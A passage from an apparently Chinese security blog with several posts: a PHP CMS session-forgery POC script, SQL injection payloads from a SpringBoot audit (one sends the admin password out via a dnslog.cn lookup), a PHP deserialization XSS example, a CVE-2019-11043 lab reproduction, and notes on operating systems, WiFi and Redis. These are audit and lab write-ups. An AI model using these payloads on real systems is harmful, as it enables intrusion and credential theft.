str_shuffle($chars);</span><br><span class="line">		$str     =   substr($chars,<span class="number">0</span>,$len);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 中文随机字</span></span><br><span class="line">		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line">		  $str.= <span class="keyword">self</span>::msubstr($chars, floor(mt_rand(<span class="number">0</span>,mb_strlen($chars,<span class="string">'utf-8'</span>)<span class="number">-1</span>)),<span class="number">1</span>,<span class="string">'utf-8'</span>,<span class="keyword">false</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>爆破100以内，md5值的第一位为1，第二位不为数字的数</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	md5=hashlib.md5()</span><br><span class="line">	md5.update(str(a).encode(<span class="string">"utf8"</span>))</span><br><span class="line">	end=md5.hexdigest()</span><br><span class="line">	<span class="keyword">if</span> end.startswith(<span class="string">'1'</span>) <span class="keyword">and</span> <span class="keyword">not</span> end[<span class="number">1</span>].isdigit():</span><br><span class="line">		print(<span class="string">'-------------&gt;'</span>,a)</span><br><span class="line">	a=int(a)+<span class="number">1</span></span><br><span class="line">	print(end)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">100</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/image-20210628165929330.png" alt="image-20210628165929330"></p>
<p>POC</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Session</span><span class="params">(req,domain)</span>:</span></span><br><span class="line">    URL = domain + <span class="string">'/index.php/base?a=verifycode&amp;verify='</span></span><br><span class="line">    AdminURL = domain + <span class="string">'/index.php/Admin/Public/AdminLeft/MenuTopID/7'</span></span><br><span class="line">    payload_one = <span class="string">'AdminID'</span></span><br><span class="line">    payload_two = <span class="string">'AdminName'</span></span><br><span class="line">    payload_three = <span class="string">'AdminGroupID&amp;mode=1&amp;length=2'</span></span><br><span class="line">    res_one = req.get(URL + payload_one).headers</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'set-cookie'</span> <span class="keyword">in</span> res_one:</span><br><span class="line">        print(res_one[<span class="string">'set-cookie'</span>])</span><br><span class="line">    res_two = req.get(URL + payload_two).headers</span><br><span class="line">    res_three = req.get(URL + payload_three).headers</span><br><span class="line">    </span><br><span class="line">    res_admin = req.get(AdminURL)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'模板'</span> <span class="keyword">in</span> res_admin.text:</span><br><span class="line">        print(<span class="string">'OK'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    domain = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">    banner(domain)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        req = requests.session()</span><br><span class="line">        <span class="keyword">if</span> Session(req,domain):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></div>


      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-某个SpringBoot项目的审计" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2021/06/05/某个SpringBoot项目的审计/" class="article-date">
  <time datetime="2021-06-05T03:10:39.000Z" itemprop="datePublished">2021-06-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="某个SpringBoot项目的审计"><a href="#某个SpringBoot项目的审计" class="headerlink" title="某个SpringBoot项目的审计"></a>某个SpringBoot项目的审计</h1><p>在github上看到的这个SpringBoot项目，作者刚提交不久，一些功能还没完善。好奇心让我下载了这个项目，打算在本地审计一波，遂有了此文。</p>
<p>拿到一个java的项目，我习惯先看是什么框架。持久层用的什么，然后是maven项目的话，pom文件里的依赖都是哪些，版本又是如何。再就是看项目里filter对参数的过滤情况。</p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul>
<li>第一处注入</li>
</ul>
<p>项目的持久层用的mybatis，这里我就直接查看项目里的sql映射文件，看到这一处sql语句，${sql}完全可控，明显一处注入</p>
<p><img src="/images/Article_images/image-20210614131759313.png" alt="image-20210614131759313"></p>
<p>一路跟上去看看有没有调用的</p>
<p>，<img src="/images/Article_images/image-20210614132523077.png" alt="image-20210614132523077"></p>
<p><img src="/images/Article_images/image-20210614132822231.png" alt="image-20210614132822231"></p>
<p>可惜的是，作者唯独没调用这个getAreaBySql，应该是项目还没完善吧。为了验证一下这里的问题，我在controller里自己加了一处调用该函数。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/getAreaBySql&quot;)</span><br><span class="line">public RespDto&lt;List&lt;AreaReturnDto&gt;&gt;  getArea(@RequestParam(&quot;sql&quot;)String sql)&#123;</span><br><span class="line">	List&lt;AreaReturnDto&gt; list=areaService.getAreaBySql(sql);</span><br><span class="line">	return RespDto.succResult(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>小小的尝试</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">sql=(select 1  and extractvalue(1,concat(0x7e,user())))</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/image-20210614133459925.png" alt="image-20210614133459925"></p>
<p>拿到结果，不过这里需要在控制台里才能看到结果，实战中应尝试dnslog拿结果，前提是对方的mysql secure_file_priv不为null，有load_file的权限</p>
<p><img src="/images/Article_images/image-20210614133554737.png" alt="image-20210614133554737"></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnslog payload</span><br><span class="line">sql=(select load_file(concat(&apos;\\\\&apos;,(select password from sys_member_info where user_name=&apos;admin&apos;),&apos;.4i06oo.dnslog.cn\\test&apos;)))</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/image-20210614133917547.png" alt="image-20210614133917547"></p>
<p>拿到结果</p>
<p><img src="/images/Article_images/image-20210614134001374.png" alt="image-20210614134001374"></p>
<ul>
<li><p>第二处注入</p>
<p>这两个参数任选其一即可</p>
<p><img src="/images/Article_images/image-20210614195231427.png" alt="image-20210614195231427"></p>
<p>看看哪里调用了</p>
<p><img src="/images/Article_images/image-20210614195501756.png" alt="image-20210614195501756"></p>
<p><img src="/images/Article_images/image-20210614195539485.png" alt="image-20210614195539485"></p>
</li>
</ul>
<p>  <img src="/images/Article_images/image-20210614195420133.png" alt="image-20210614195420133"></p>
<p>找到调用的，直接开干，这里需要注意传的数据要是json的，不然得不到结果，也就是下面的enctype那里</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://localhost:8888/chongzhilog/list</span><br><span class="line">&#123;&quot;page&quot;:1,&quot;limit&quot;:10,&quot;id&quot;:&quot;1&quot;,&quot;startTime&quot;:&quot;1&apos;,&apos;2&apos;,&apos;00:00:00&apos;) and extractvalue(1,concat(0x7e,user()))--+&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/Article_images/image-20210614195827125.png" alt="image-20210614195827125"></p>
<p>得到结果</p>
<p><img src="/images/Article_images/image-20210614200012714.png" alt="image-20210614200012714"></p>
<p>同样的可以尝试用dnslog拿到结果</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-操作系统概述" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/03/操作系统概述/">操作系统概述</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/11/03/操作系统概述/" class="article-date">
  <time datetime="2019-11-03T10:15:24.000Z" itemprop="datePublished">2019-11-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/计算机操作系统/">计算机操作系统</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="操作系统概述"><a href="#操作系统概述" class="headerlink" title="操作系统概述"></a>操作系统概述</h1><p>操作系统概念:<br>        控制和管理整个计算机系统的硬件与软件资源，合理地组织，调度计算机的工作与资源的分配，进而为用户和其他软件提供方便接口与环境的程序接口。操作系统是随着计算机研究和引用的发展逐步形成并发展起来的，他是计算机系统中最基本的系统软件</p>
<p>并发(Concurrence):<br>        两个或多个事件在同一时间间隔内发生。操作系统并发性是指计算机系统中同时存在多个运行的程序，因此它具有处理和调度多个程序同时执行的能力，在操作系统中，因此引入进程的目的是使程序能够并发执行</p>
<p>共享(Sharing):<br>        系统中的资源可供内存中多个并发执行的进程使用</p>
<p>互斥共享:<br>        系统中某些资源，规定在一段时间内只允许一个进程访问该资源。典型资源:打印机，磁带机。</p>
<p>同时访问:<br>        系统中另一些资源允许一段时间内由多个进程”同时”访问。这里的”同时”通常是宏观上的，微观上，这些进程可能是交替对资源进行访问即”分时共享”的。典型资源是磁盘设备</p>
<p>虚拟(Virtual)：<br>        把一个物理上的实体变为若干逻辑上的对应物。物理实体是实的，后者是用户感觉上的事物。操作系统中利用了多种虚拟技术来实现虚拟处理器，虚拟内存和虚拟外设</p>
<p>虚拟处理器技术:<br>                通过躲到程序设计技术，采用让多道程序并发执行的方法，来分时使用一个处理器。</p>
<p>虚拟技术:<br>        时分复用技术，如处理器分时共享;空分复用技术，如虚拟存储器</p>
<p>异步(Asynchronism):<br>          多道程序环境允许多个程序并发执行，但由于资源有限，进程的执行并不是一贯到底，而是走走停停，它以不可预知的速度向前推进，这就是进程异步</p>
<ul>
<li><p>操作系统目标和功能</p>
<p>  为给多道程序提供良好的运行环境，操作系统应具备以下功能:</p>
<pre><code>处理机管理
存储器管理
设备管理
文件管理    </code></pre></li>
</ul>
<p>操作系统作为计算机系统资源的管理者:<br>1&gt; 处理机管理:<br>        多道程序环境下，处理机的分配和运行都以进程为基本单位，因此对处理机的管理可归结为对进程的管理。并发是指计算机内同时运行多个进程，因此进程何时创建，何时撤销，如何管理，如何避免冲突，合理共享就是进程管理的最主要任务。进程管理主要功能包括进程控制，进程同步，进程通信，死锁处理，处理机调度等</p>
<p>2&gt;存储器管理:<br>        为了给多道程序的运行提供良好的环境。方便用户使用使用及提高内存的利用率，主要包括内存分配，地址映射，内存保护与共享和内存扩充等功能</p>
<p>3&gt;文件管理:<br>        计算机中的信息都是以文件的形式存在的，操作系统中负责文件管理的部分称为文件系统。文件管理包括文件存储空间的管理，目录管理及文件读写管理和保护等</p>
<p>4&gt;设备管理:<br>        完成用户I/O请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓存管理,设备分配，设备处理和虚拟设备等功能</p>
<p>操作系统作为用户与计算机硬件系统之间的接口:<br>        操作系统提供的接口主要分为两类:命令接口，用户利用这些操作命令来组织和控制作业的执行；另一类是程序接口，编程人员可以使用它们来请求操作系统服务</p>
<p>1&gt;命令接口:<br>        使用命令接口进行作业控制主要有两种方式:联机控制，脱机控制。按作业控制方式不同，可将命令接口分为 联机命令接口 和 脱机命令接口</p>
<p>联机命令接口:可以理解为”雇主”说一句话，”工人”做一件事，并作出反馈，这就强调交互性<br>脱机命令接口:可以理解为”雇主”把要”工人”做的事写在清单上，”工人”按照清单命令逐条完成这些事，这就是批处理</p>
<p>2&gt;程序接口:<br>        程序接口由一组系统调用命令组成。用户通过在程序中使用这些系统调用命令来请求操作系统为其提供服务。</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-关于php反序列化漏洞小记" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/30/关于php反序列化漏洞小记/">关于php反序列化漏洞小记</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/30/关于php反序列化漏洞小记/" class="article-date">
  <time datetime="2019-10-30T03:10:39.000Z" itemprop="datePublished">2019-10-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="关于php反序列化漏洞小记"><a href="#关于php反序列化漏洞小记" class="headerlink" title="关于php反序列化漏洞小记"></a>关于php反序列化漏洞小记</h1><p>php程序为了保存和存储对象，提供了序列化的方法，php序列化是为了在程序运行的过程中对对象进行转储而产生的。<br>序列化可以将对象转换成转换成字符串，但仅保留对象中的成员变量，不保留函数方法。<br>php序列化的函数为serialize，反序列化函数为unserialize</p>
<p>看这样一段php代码，</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">		public $a=&apos;this a&apos;;</span><br><span class="line">		protected $b=&apos;this b&apos;;</span><br><span class="line">		private $c=&apos;this C&apos;;</span><br><span class="line">		</span><br><span class="line">		public function test1()&#123;	</span><br><span class="line">		 return &apos;this is test 1&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$test=new Test();</span><br><span class="line">	var_dump(serialize($test)); //var_dump用于输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>输出结果为<br>string(87) “O:4:”Test”:3:{s:1:”a”;s:6:”this a”;s:4:”<em>b”;s:6:”this b”;s:7:”Testc”;s:6:”this C”;}”<br>相关解释：<br>O代表对象,4表示该对象名称有4个字符，<br>“Test”表示该对象名称，<br>3表示该对象有3个成员，<br>接着是括号里的。这个类的三个成员变量由于变量前的修饰不同，序列化后显示的也不同。<br>第一个变量a序列化后为s:1:”a”;s:6:”this a”;   序列化后的字符串以分号分隔每一个变量特征。<br>分号左边是变量名，分号右边是变量值，这里s表示字符串，1表示字符串中只有一个字符，“a”表示该字符串为a，右边的同理<br>第二个变量与第一个有点不同，，多了个 星号(</em>)，这是因为“a”是public属性，而第二个变量b是protected属性，php为了区分这些属性所有进行了一些修饰<br>**另外这里要注意</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当变量修饰为protected时，序列会时会在变量名前加%00*%00</span><br><span class="line">当变量为private时，会在成员变量名前添加%00类名%00</span><br></pre></td></tr></table></figure></div>

<pre><code>**magic 函数**</code></pre><p>php面向对象变成中，有一类函数叫做magic function，魔术函数，</p>
<p>这些函数是以<strong>(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里说一下比较常见的例如</strong>construct，__destory，</p>
<p><strong>sleep，</strong>wakeup，__toString函数。</p>
<pre><code>__construct()
__contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数

__destruct()
__destruct()函数被称为析构函数，当类结束的时候自动调用该函数

__sleep()
__sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

__wakeup()
__wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数

__toString()
__toString()函数是当对象被当做字符串的时候会自动调用该函数</code></pre><p><strong>php反序列化漏洞</strong></p>
<p>这里来个小栗子：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;test&apos;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">这里控制test参数就可以进行反射型xss，例如将test=O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/aaa/)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这篇文章更为详细</p>
<p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-CVE-2019-11043-复现" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/24/CVE-2019-11043-复现/" class="article-date">
  <time datetime="2019-10-24T02:36:41.000Z" itemprop="datePublished">2019-10-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="CVE-2019-11043-复现"><a href="#CVE-2019-11043-复现" class="headerlink" title="CVE-2019-11043 复现"></a>CVE-2019-11043 复现</h1><p><strong>漏洞详情</strong><br>2019年10月22日,国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP.<br>该漏洞 是Andrew Danau在某比赛解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时，服务返回异常发现的漏洞.<br>2019年9月26日,PHP官方发布漏洞通告,其中指出:使用 Nginx + php-fpm的服务器,在部分配置下,存在远程代码执行漏洞.且该配置已被广泛使用，危害较大,影响较为广泛.相关工具已经公开在Github</p>
<p><strong>环境搭建</strong><br>Vulhub中现成的环境，，所以这里直接在docker里部署就ok，。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub  //下载vulhub </span><br><span class="line">Apt install golang-go  //安装go</span><br><span class="line">go get -u github.com/neex/phuip-fpizdam  //下载exp</span><br></pre></td></tr></table></figure></div>

<p>进入/vulhub/php/CVE-2019-11043，，启动环境<br><img src="/images/Article_images/cve-2019-11043_1.png" alt></p>
<p>docker-compose up -d 拉取镜像<br><img src="/images/Article_images/cve-2019-11043_2.png" alt></p>
<p>然后docker ps查看<br><img src="/images/Article_images/cve-2019-11043_3.png" alt></p>
<p>,环境已经成功启动<br><img src="/images/Article_images/cve-2019-11043_4.png" alt></p>
<p><strong>下面开始利用</strong><br>cd go/bin<br>/phuip-fpizdam <a href="http://192.168.78.130:8080/index.php" target="_blank" rel="noopener">http://192.168.78.130:8080/index.php</a><br><img src="/images/Article_images/cve-2019-11043_5.png" alt><br><img src="/images/Article_images/cve-2019-11043_6.png" alt><br>这里可以看到以及成功利用</p>
<p><strong>修复建议及影响范围</strong><br>影响范围：PHP 5.6-7.x<br>修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符<br>OR<br>暂停使用 nginx+php-fpm 服务<br>OR<br>删除如下配置</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">fastcgi_param PATH_INFO $fastcgi_path_info;</span><br></pre></td></tr></table></figure></div>


      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-WiFi网络结构" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/23/WiFi网络结构/" class="article-date">
  <time datetime="2019-10-23T07:00:33.000Z" itemprop="datePublished">2019-10-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/无线渗透/">无线渗透</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="wifi网络结构"><a href="#wifi网络结构" class="headerlink" title="wifi网络结构"></a>wifi网络结构</h1><p>一般架设wifi网络的基本设备就是无线网卡和一台AP，AP为Access point的简称，一般翻译为“无线访问介入点”或者“桥接器”，如无线路由器，他主要在媒体存取控制层mac中扮演无线工作站与有线局域网的桥梁。<br>有了AP，就像有线网络的Hub(集线器),无线工作站就可以快速轻易地与无线网络相连。<br>        单纯型AP<br>      /<br>无线AP<br>      <br>        扩展型Ap</p>
<p><strong>单纯型AP</strong><br>由于缺少路由功能，仅仅提供一个无线信号发射的功能，他的工作原理是将网络信号通过双绞线传送过来，经过无线AP的编译，将电信号转化为无线电信号发送出来，形成wifi共享上网的覆盖，根据不同的功率，网络的覆盖程度也是不同的，一般无线AP的最大覆盖距离可达400m</p>
<p><strong>扩展型Ap</strong><br>扩展型AP就是人们常说的无线路由器，无线路由器，顾名思义就是带有无线覆盖功能的路由器。通过路由功能，可以实现家庭wifi共享上网的internet连接共享，也能实现ADSL和小区宽带的无线共享接入</p>
<p><strong>AP常用语</strong><br>1.SSID<br>Service Set Identifier缩写，意思是服务集标识。SSID技术可以将一个无线局域网分为几个需要不同身份验证的自网络，每一个子网络都需要独立的身份验证。只有通过身份验证的用户才可以进入相应的子网络，防止未授权进入网络<br>，可区分不同网络，SSID通常由AP广播出来，简单说SSID就是一个局域网名称。<br>2.信道<br>无线信道也就是常说的无线的“频段”,其是以无线信号作为传输媒体的数据信号传送通道。在无线路由器中，通常有13个信道。<br>3.模式<br>指802.11协议的几种类型，通常在无线路由器中包括五种模式，分别是11b only，11g only，11n only，11bg mixed和11bgn mixed</p>
<p><strong>频段带宽</strong><br>是发送无线信号频率的标准，频率越高越易失帧，在11n模式中，一般包括20MHz和40MHz两个频段带宽，其中20MHz在11n的情况下能达到144Mbps带宽，且穿透性好，传输距离远（100m左右）；40MHz在11n的情况下能达到300Mbps带宽，穿透性差，传输距离近（约50m）<br><strong>WDS（无线分布式系统）</strong><br>Wireless Distribution System，无线分布式系统。是一个在IEEE802.11网络中多个无线访问点通过无线互联的系统。他允许将无线网络通过多个访问点进行扩展，而不像以前一样无线访问点要有线进行连接，这种可扩展性能，使无线网络具有更大的传输距离。</p>
<p><strong>WirelessMon规划频段</strong><br>想完全错开使用信道不容易，可以做到尽量避免冲突，在windows中提供wirelessmon工具，可以监控无线适配器和聚集状态，并显示周边无线接入点或基站实时信息的工具</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Redis小结" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/19/Redis小结/">Redis小结</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/19/Redis小结/" class="article-date">
  <time datetime="2019-10-19T13:59:25.000Z" itemprop="datePublished">2019-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/杂记/">杂记</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="Redis小结"><a href="#Redis小结" class="headerlink" title="Redis小结"></a>Redis小结</h1><p>启动 redis-server<br>进去命令行客户端，redis-cli<br>关闭原来服务器，shutdown<br>在远程redis服务器上执行命令，redis-cli -h host -p port -a password</p>
<p>1.set和get命令，键为icando，对应值为youcando（注意，一个键最大存储512MB）<br><strong>String（字符串）</strong></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set icando &quot;youcando&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get icando</span><br><span class="line">&quot;youcando&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>Hash（哈希）</strong><br>hash是一个键值对集合，它是一个string类型的fieled和value的映射表，热别适合用于存储对象</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset two field1 &quot;a&quot; field2 &quot;b&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; hget two field1</span><br><span class="line">&quot;a&quot;</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>List（列表）</strong><br>redis 列表是简单的字符串列表，按照插入顺序排序，可以添加一个元素到列表的头部（左边）或者尾部（右边）</p>
